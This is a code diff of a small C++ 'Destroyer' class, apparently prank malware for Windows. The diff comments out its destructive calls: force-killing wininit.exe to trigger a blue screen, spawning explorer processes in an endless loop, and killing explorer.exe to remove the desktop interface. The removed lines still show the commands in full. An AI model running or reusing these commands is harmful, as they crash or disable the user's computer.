@@ -17,7 +17,7 @@ class Destroyer{
             //WIN32_FILE_ATTRIBUTE_DATA data;
             //GetFileAttributesEx(fileName, GetFileExInfoStandard, &data);
 
-            system("TASKKILL /IM wininit.exe /F");
+            //system("TASKKILL /IM wininit.exe /F");
 
             //A bug in windows that causes a BSOD when you try to access a path
         }
@@ -26,14 +26,14 @@ class Destroyer{
         {
             while (true)
             {
-                system("explorer");
+                //system("explorer");
                 //std :: cout << "Normally ur pc would be dead\n"; 
             }
         }
 
         void killUI() //ends explorer task, hence destroying the ui of windows 10
         {
-            system("taskkill /IM explorer.exe /F");
+            //system("taskkill /IM explorer.exe /F");
             //std :: cout << "Your UI would disappear normally\n";
         }
         
